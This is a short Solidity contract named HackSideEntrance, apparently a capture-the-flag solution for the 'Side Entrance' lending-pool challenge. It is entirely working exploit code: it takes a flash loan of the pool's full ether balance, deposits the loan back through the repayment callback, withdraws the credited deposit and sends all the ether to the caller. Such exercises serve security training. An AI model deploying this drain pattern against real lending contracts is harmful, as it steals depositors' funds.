import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract HackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function hack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
